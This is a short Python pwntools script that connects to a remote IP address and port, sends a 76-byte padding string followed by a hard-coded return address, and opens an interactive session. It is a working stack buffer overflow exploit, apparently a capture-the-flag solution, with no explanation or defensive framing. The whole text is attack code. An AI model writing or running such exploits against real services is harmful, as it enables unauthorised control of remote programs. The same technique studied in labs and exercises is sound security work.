from pwn import *
c = remote("18.210.60.58","7807")
c.sendline('A'*76+'\xcf\x85\x04\x08')
c.interactive()

